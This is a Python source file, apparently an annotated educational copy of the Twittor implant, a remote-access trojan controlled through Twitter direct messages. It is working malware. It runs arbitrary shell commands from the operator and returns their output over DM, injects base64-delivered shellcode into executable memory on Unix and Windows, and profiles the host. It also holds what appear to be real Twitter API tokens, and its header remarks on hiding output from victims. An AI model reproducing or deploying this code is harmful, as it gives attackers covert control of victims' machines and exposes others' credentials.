#!/usr/bin/env python

"""
    An idea from Professor Viviek of SPSE, project referenced from:
    www.github.com/PaulSEc/twittor/

    Basically annotated version of implant.py of the above project for eductional purposes,
    and added a few new personal additions:
        1. shellcode injection in unix systems

    Things to improve on: 
        1. a real malicious user would turn off all output message to victim, and pass on all exceptions to keep the script running
    


"""
#################################################################################################################################################

# importing modules needed
from tweepy import Stream                                       # for twitter stream object
from tweepy import OAuthHandler                                 # for handling twittor oauth logins
from tweepy import API                                          # twitter API for its functionalities such as DM
from tweepy.streaming import StreamListener                     # stream handler for twitter stream obj
from uuid import getnode as get_mac                             # for getting mac_address of host
import ctypes                                                   # for shell code execution (please do more research on module)
import json                                                     # for loading data from http (twitter) stream
import threading                                                # for cocurrent threads of tasks
import subprocess                                               # for executing bash commands
import base64                                                   # for base64 encoding purpose
import platform                                                 # for ping service
import sys                                                      # for system implementations
import os                                                       # for bash commands execution, and low level system implementations
import mmap                                                     # for memory allocation in unix systems

##################################################################################################################################################

# mac_getter function for global config operations
def mac_getter():
    """
        params None:
        return string: mac address of minion
    
    """
    mac = None
    mac_list = []
    mac_string = "%012X" % (get_mac())                      # using uuid's getnode as ge_mac to get host machine's mac in string
    
    for i in range(0,12,2):                                 # using a for loop to split the string up to two char per element
        mac_list.append(mac_string[i:i+2])

    mac = ":".join(mac_list)                                # then joining them with : like in regular mac addresses

    return mac                                              # returning it back to the config dict

##################################################################################################################################################

# global variables
__API__ = None

__CONFIG__ = {                                                                          # configuration dict, could be exported from config file
            "consumer_token": "6VCDNZmaT2eXzquqWsGQhPfsn",
            "consumer_secret": "b0NjQJIJnBWsAq2UDwSatiYsjlYb873GBKwTfKb0h9QNCmuToI",
            "access_token": "1000867362034171904-UKXZqtyPb0271lpN9Jx8USXCUCOdJL",
            "access_token_secret": "oeSfY02Xk6lOyd9vl1Kw9W0OZhDjCYO1LILazrblK6itK",
            "username": "rennnitbaby",
            "mac_address": mac_getter()                                                 # host mac is evaulated by mac_getter function
        }




##################################################################################################################################################

# class definitions

## exception handling

class TwittorException(Exception):
    """
        superClass: Exception class
        Base exception of this program
    
    """
    def __init__(self, message, errors):
        Exception.__init__(self, message)
        self.errors = errors
	print message
	print errors

#-----------------------------------------------------------------------------------------------------------------------------------------------#

class DecodingException(TwittorException):
    """
        superClass: TwittorException class
        Exception handling when failed to decode a command output
    
    """
    pass

class ShellcodeExecException(TwittorException):
    """
        superClass: TwittorException
        Exception handling when failed to execute shellcode
    
    """
    pass

class TwittorStreamException(TwittorException):
    """
        superClass: TwittorException
        Exception handling when failed to establish twitter api
        
    
    """
    pass

#------------------------------------------------------------------------------------------------------------------------------------------------#
class CommandToExecute:
    """
        superClass: None
        handler class that controls bash command execution
    
    """

    def __init__(self, message):
        """
            param1 string: json message received from master
            return obj: CommandToExecute class object 
        
        """
        
        try:
            # message is passed in as rawdata['direct_message']['text'] from stream, and it is also a JSON object sent by master
            data = json.loads(base64.b64decode(message))
            self.data = data
            self.sender = data['sender']
            self.receiver = data['receiver']
            self.cmd = data['cmd']
            self.jobid = data['jobid']
        
        except Exception as e:
            print "Error from decoding the command in commandToExecute class, message: %s"%message, e

    def is_for_me(self):
        """
            param1 obj: self object
            return bool: whether or not the cmd message if this particular minion
        
        
        """

        global __CONFIG__                                                                                       # config[user] is used
       
        # aka if the mac address is mine, and also if cmd is to ping, and there is no output in the JSON packet
        if __CONFIG__['mac_address'] == self.receiver or self.cmd == 'PING' and 'output' not in self.data:
            return True
        else:
            return False

    def retrieve_command(self):
        """
            param1 obj: self object
            return tuple: tuple of jobid, command
        
        """
        return self.jobid, self.cmd                     # returning tuple of job ID and command

#------------------------------------------------------------------------------------------------------------------------------------------------#

class CommandOutput:
    """
        superClass: None
        handler class that controls the functionality of building output to his master from this minion

    """

    def __init__(self, sender, receiver, output, jobid, cmd):                               # assigning value with params
        """
            param1 obj: self object
            param2 string: sender name/mac
            param3 string: receiver name/mac
            param4 string: stdout/err results 
            param5 string: jobid
            param6 string: cmd executed
            return obj: CommandOutput class object
        
        """
        self.sender = sender
        self.receiver = receiver
        self.output = output
        self.jobid = jobid
        self.cmd = cmd
    
    def build(self):                                                                        # building a dict of cmd output to be sent to master
        """
            param1 obj: self object
            return dict: dictionary of all the data that will be send back to the master
        
        """
        cmd_output = {'sender': self.sender,
                        'receiver': self.receiver,
                        'output': self.output,
                        'cmd': self.cmd,
                        'jobid': self.jobid}
        
       
        return base64.b64encode(json.dumps(cmd_output))            # converting output to json by json.dumps, and then encoding it for delivery

#------------------------------------------------------------------------------------------------------------------------------------------------#

class ExecuteShellcode(threading.Thread):
    """
        superClass: threading.Thread class
        handler class responsible for shellcode execution
    
    
    """ 
    def __init__(self, jobid, shellcode):
        """
            param1 obj: self object
            param2 string: jobid of the task
            param3 string: shellcode to be executed
            return obj: ExecuteShellcode class object
    
        """
    
        threading.Thread.__init__(self)
        self.jobid = jobid                                              # binding values
        self.shellcode = shellcode
    
        self.daemon = True                                              # daemon will continue execution after main thread exits
        self.start()                                                    # start thread
    
    def run(self):
        """
            param1: self object
            return None: thread executed with method tasks 
        
        """
    
        if os.name == 'posix':                                              # for unix systems
            try:
                try:
                    libc = ctypes.CDLL('libc.so.6', use_errno=True)         # satisfies most linux distros, errno is for debugging purposes
                except:
                    libc = ctypes.CDLL('libc.dylib', use_errno=True)        # for darwin kernels aka osx
                size = len(self.shellcode)                                  # size of our shellcode payload
    
                # create pointer for shellcode
                sc_ptr = ctypes.c_char_p(self.shellcode)                                            # pointer to shellcode    
                
                # allocating executable space
                current_fd = os.open(__file__, os.O_RDWR)                                           # current script's file descriptor
                protection = mmap.PROT_READ | mmap.PROT_WRITE | mmap.PROT_EXEC
                free_space = mmap.mmap(current_fd, size, flags=mmap.MAP_PRIVATE, prot=protection)   # allocate space with desire protection
                                                                                                    # map_private is to allocate private space, 
                # create pointer for allocated space                                                # differs from main thread's memory space
                free_space_ptr = (ctypes.c_char * size).from_buffer(free_space)                     # generating ptr from freespace buffer
    
                ctypes.memmove(free_space_ptr, sc_ptr, size)                                        # copying sc ptr to free space ptr 
                run = ctypes.cast(free_space_ptr, ctypes.CFUNCTYPE(ctypes.c_void_p))                # casting the allocated and copied shellcode
                run()                                                                               # running shellcode
    
                self.unix_exit(current_fd, free_space)
            
            except Exception as e:
                print 'Error when running shellcode on unix systems', e
    
        else:                                                                                   # for windows system
            try:
                
                shellcode = bytearray(self.shellcode)                                           # converting shellcode into bytes
                size = len(self.shellcode)                                                      # length of shellcode


                
                # creating a ctypes buffer pointer for shellcode
                sc_ptr = (ctypes.c_char * size).from_buffer(shellcode)                      # similar to ctypes.c_char_p(shellcode) in unix

                
                # allocating the space for shellcode bytes to be executed
                ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),      # null pointer constant value for starting address to allocate
                        ctypes.c_int(size),                                     # length of our shellcode in byte array format
                        ctypes.c_int(0x3000),                                   # reserve and commit allocation type flag
                        ctypes.c_int(0x40))                                     # enable rwx access to the commited region
                freespace_ptr = ctypes.c_int(ptr)                               # pointer to the allocated space

    
    
                # move the converted buffer to the reserved and commited process memory space (similar to memmove in unix)
                ctypes.windll.kernel32.RtlMoveMemory(freespace_ptr, sc_ptr, ctypes.c_int(size))      

                # create and start executing the thread from the reserved memory pointer location
                thread_handle = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),                # null for pointer to security attr
                        ctypes.c_int(0),                                        # initial size of stack, 0 is for new thread
                        ctypes.c_int(ptr),                                      # pointer to the location that we start executing for new thread 
                        ctypes.c_int(0),                                        # null for pointer for params passed to thread
                        ctypes.c_int(0),                                        # 0 for creation flag, thread runs immediately after creation 
                        ctypes.pointer(ctypes.c_int(0)))                        # pointer to an int location to store thread id
                                                                                # thread_handle is returned in the end

                # block execution until thread is finished executing
                ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(thread_handle), ctypes.c_int(-1))       # non 0 value, aka -1 for wait

                self.wind_exit(ptr, size)                                                                       # releasing memory
                
            except Exception as e:
                print "Error in executing the shellcode in windows system", e
    
    # these methods will only be called if payload exit func=None
    #NOTE: metasploit 4.16 exitfunc=none does not work, so below functions never get called, and this script is exited 
    def wind_exit(self, mem_toflush, size):
        """
            param1 obj: self object
            param2 obj: ctypes instance of allocated memory pointer
            param3 int: size of the allocated memory to clear
            return None: cleanly exits the windows program upon shellcode completes execution
        
        """
        ctypes.windll.kernel32.VirtualFree(mem_toflush, size, 0x8000)               # relasing the allocated space
	print "[!] Sucessfully exited out of shellcode process"
        return
    
    def unix_exit(self, fd_toclose, mem_toflush):
        """
            param1 obj: self object
            param2 int: file descriptor to close
            param3 obj: ctypes instance of allocated memory pointer
            return None: cleanly exits the unix program upon shellcode completes execution
        
        
        """
        mem_toflush.flush()                             # flushing allocated memory
        mem_toflush.close()                             # closing allocated memory
        os.close(fd_toclose)                            # closing current file descriptor 
	print "[!] Sucessfuly exited out of shellcode process"
        return 
    
#------------------------------------------------------------------------------------------------------------------------------------------------#

class ExecuteCommand(threading.Thread):
    """
        superClass: threading.Thread
        handler class responsible for executing bash commands
    
    
    """
    def __init__(self, jobid, cmd):
        """
            param1 obj: self object
            param2 string: jobid of the tasks we need to execute, needed for identification purpose
            param3 string: bash command we need to execute
            return obj: ExecuteCommand class object
        
        
        """
        threading.Thread.__init__(self)             # first lets initialize the thread
        self.jobid = jobid
        self.command = cmd

        # set up our thread in the initalization process
        self.daemon = True                          # this will not exit when main thread exits
        self.start()                                # starting thread
    
    def run(self):                                  # each thread will do the following
        """
            param1 obj: self object
            return None: thread executed with method tasks 
        
        """
        global __CONFIG__                           # globals we need
        global __API__

        if self.command == 'PING':                  # if our command is ping, lets return all of host machine's info
            output = platform.platform()
        else:   # redirect stde to stdo so it is part of output, and having a pipe to stdin so we can give it cmdline params/file if needed
	    self.command = " ".join(self.command)				# make sure the list is joint before processing
            output = subprocess.check_output(self.command, shell=True, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)

        # initialize the command output object with all necessary params
        command_output = CommandOutput(__CONFIG__['mac_address'], 'master', output, self.jobid, self.command)

        # then sending it thru the api method, and to the master's username, and our text we need to build it first
        __API__.send_direct_message(user=__CONFIG__['username'], text=command_output.build())

#------------------------------------------------------------------------------------------------------------------------------------------------#

class StdOutListener(StreamListener):
    """
        superClass: tweepy.streaming as StreamListener
        handler class that is responsible for establishing stream functionality with twitter api
    
    """
    global __CONFIG__

    # the on_data method is called everytime raw data is received from the stream connection
    # override when we need to directly deal with the raw data received from stream

    def on_data(self, raw_data):
        """
            param1 obj: self object
            param2 string: json message sent from master 
            return bool: True for keeping alive 
        
        """
        try:
            data = json.loads(raw_data)                                                             # deserialzes data containin JSON format

            # and if the data's has a direct message key, and its sender is our minion's master's username
            if data['direct_message'] and data['direct_message']['sender_screen_name'] == __CONFIG__['username']:
                try:
                    cmd = CommandToExecute(data['direct_message']['text'])                      # parsing our command using C.T.E. class
                    
                    if (cmd.is_for_me()):                                                       # using method to confirm and to take care of ping
                        jobid, cmd = cmd.retrieve_command()                                     # then we retrieve command
			if isinstance(cmd, list):                                               # if master command is in list form, for sh cmds
			    ExecuteCommand(jobid, cmd)                                          # execute with E.C. class
                        elif (cmd.split(' ')[0] == 'shellcode'):                                # if cmd is shellcode
                            sc = base64.b64decode(cmd.split(' ')[1]).decode('string_escape')    # decoding our shell code using b64 and decode
                            ExecuteShellcode(jobid, sc)                                         # execute shell code using E.S.C. class
                        else:                                                                   # if cmd is bash command instead, ping purposes
			    ExecuteCommand(jobid, cmd)						# execute it with E.C. class
			
                except Exception as e :                                                         # err if we cant parse and execute cmd
                    print "Error in parsing command in stdOutListener", e

        except Exception as e:
            print "Error in loading, and decoding message: %s" %raw_data, e

#        return True                                         # return true to keep the stream alive, aka keep listening, otherwise false to kill
                                                            # this alters self.running property, which is checked throughout the class methods


#################################################################################################################################################

# function definition
def main():
    """
        params: none
        return None: responsible for handling authentication with twittor api, and setting up stream
    
    """
    global __API__
    global __CONFIG__

    try:
        # setting up authentication
        auth = OAuthHandler(__CONFIG__["consumer_token"], __CONFIG__["consumer_secret"])    # passing in token and secret to handler
        auth.secure = True                                                                  # making sure secure login is set maybe deprecated
        auth.set_access_token(__CONFIG__["access_token"], __CONFIG__["access_token_secret"])# set access token so we now have access to api
        
        # authenticate the twitter api
        __API__ = API(auth)                                                 # initiating tweepy (twitter) api
        
        # set up stream object, and start userstream by its method
        stream = Stream(auth, StdOutListener())                             # initiating listening stream, and passing in stream obj with auth  
        stream.userstream()                                                 # starting user stream for user functionality listening stream
                                                                            # caution, this is a blocking call
    except Exception as e:
        print "Error in main()", e


##################################################################################################################################################
# script execution
if __name__ == '__main__':
    main()
    sys.exit(0)


